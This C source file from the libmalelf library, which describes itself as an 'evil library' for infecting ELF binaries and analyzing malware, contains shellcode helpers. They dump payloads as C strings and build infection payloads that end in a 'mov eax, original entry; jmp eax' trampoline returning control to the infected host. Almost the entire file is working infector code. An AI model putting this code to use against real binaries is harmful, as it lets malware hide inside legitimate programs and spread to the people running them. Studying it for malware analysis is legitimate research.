/*
 * The libmalelf is an evil library that could be used for good! It was
 * developed with the intent to assist in the process of infecting
 * binaries and provide a safe way to analyze malwares.
 *
 * Evil using this library is the responsibility of the programmer.
 *
 * Author:
 *         Tiago Natel de Moura <natel@secplus.com.br>
 *
 * Contributors:
 *         Daniel Ricardo dos Santos <danielricardo.santos@gmail.com>
 *         Paulo Leonardo Benatto    <benatto@gmail.com>
 *
 * Copyright 2012, 2013 by Tiago Natel de Moura. All Rights Reserved.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
 * implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <assert.h>
#include <errno.h>

#include <elf.h>
#include <sys/mman.h>

#include <malelf/defines.h>
#include <malelf/types.h>
#include <malelf/error.h>
#include <malelf/debug.h>
#include <malelf/binary.h>
#include <malelf/defines.h>
#include <malelf/shellcode.h>

_u32 malelf_shellcode_dump(MalelfBinary *bin)
{
        assert(NULL != bin && NULL != bin->mem && bin->size > 0);
        return malelf_dump(bin->mem, bin->size);
}

_u32 malelf_shellcode_get_c_string(FILE *fp, MalelfBinary *bin)
{
        _u32 i;
        assert(NULL != bin && NULL != bin->mem && bin->size > 0);

        for (i = 0; i < bin->size; i++) {
                fprintf(fp, "\\x%02x", bin->mem[i]);
        }

        return MALELF_SUCCESS;
}

_u32 malelf_shellcode_create_flat(MalelfBinary *output,
                                  MalelfBinary *shellcode,
                                  _u32 *magic_offset,
                                  unsigned long int original_entry_point,
                                  unsigned long int magic_bytes)
{
        _u32 count = 0;
        _u32 error;

        union malelf_dword entry_point;

        assert (NULL != shellcode);
        assert (NULL != output);
        assert (NULL != shellcode->mem);
        assert (shellcode->size > 0);

        if (original_entry_point > 0) {
                entry_point.long_val = original_entry_point;
        } else if (magic_bytes != 0x00) {
                entry_point.long_val = magic_bytes;
        } else {
                entry_point.long_val = MALELF_MAGIC_BYTES;
        }

        error = malelf_binary_malloc_from(output, shellcode);

        count = output->size;

        /**
         * Adding the JMP HOST opcode snippet.
         */

        if ((error = malelf_binary_add_byte(output, "\xb8"))
            != MALELF_SUCCESS) {
                return error;
        }
        count++;

        error = malelf_binary_add_byte(output,
                                       &entry_point.char_val[0]);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        error = malelf_binary_add_byte(output,
                                       &entry_point.char_val[1]);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        error = malelf_binary_add_byte(output,
                                       &entry_point.char_val[2]);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        error = malelf_binary_add_byte(output,
                                       &entry_point.char_val[3]);
        if (MALELF_SUCCESS != error) {
                return error;
        }

        /* Add JMP *EAX */
        error = malelf_binary_add_byte(output,
                                       "\xff");
        if (MALELF_SUCCESS != error) {
                return error;
        }

        error = malelf_binary_add_byte(output,
                                       "\xe0");
        if (MALELF_SUCCESS != error) {
                return error;
        }

        *magic_offset = count;

        return MALELF_SUCCESS;
}

_i32 malelf_shellcode_create_c(FILE* fd_o,
                               int in_size,
                               FILE* fd_i,
                               unsigned long int original_entry_point) {
        _u8 *mem, i, count = 0;

        union entry_t {
                unsigned long int int_entry;
                unsigned char char_entry[4];
        };

        union entry_t entry_point;

        entry_point.int_entry = original_entry_point;

        mem = mmap(0, in_size, PROT_READ, MAP_SHARED, fileno(fd_i), 0);
        if (mem == MAP_FAILED) {
                MALELF_LOG_ERROR("Failed to map binary in memory...\n");
                return -1;
        }

        malelf_print(fd_o, "/* Generated by Malelficus */\n");

        malelf_print(fd_o, "\n\nunsigned char shellcode[] = \n");

        for (i = 0; i < in_size; i++, count++) {
                if (i == 0) {
                        malelf_print(fd_o, "\t\t\t\"");
                }
                malelf_print(fd_o, "\\x%02x", mem[i]);
                if (i > 0 && ((i+1) % 10) == 0) {
                        malelf_print(fd_o, "\"\n\t\t\t\"");
                } else if (i == (in_size - 1)) {
                        malelf_print(fd_o, "\"\n");
                }
        }

        malelf_print(fd_o, "\n");

        malelf_print(fd_o, "\t\t\t/* mov eax, XXXX */\n");

        malelf_print(fd_o, "\t\t\t\"");
        malelf_print(fd_o, "\\xb8"); /* mov eax, XXXX */
        count++;
        malelf_print(fd_o, "\\x%02x", entry_point.char_entry[0]);
        malelf_print(fd_o, "\\x%02x", entry_point.char_entry[1]);
        malelf_print(fd_o, "\\x%02x", entry_point.char_entry[2]);
        malelf_print(fd_o, "\\x%02x", entry_point.char_entry[3]);

        malelf_print(fd_o, "\"\n");

        malelf_print(fd_o, "\t\t\t/* jmp eax */\n");
        /* jmp eax */
        malelf_print(fd_o, "\t\t\t\"\\xff\\xe0");
        malelf_print(fd_o, "\";\n");

        malelf_print(fd_o, "\nunsigned int patch_offset = %d;\n\n",
                     count);

        return MALELF_SUCCESS;
}
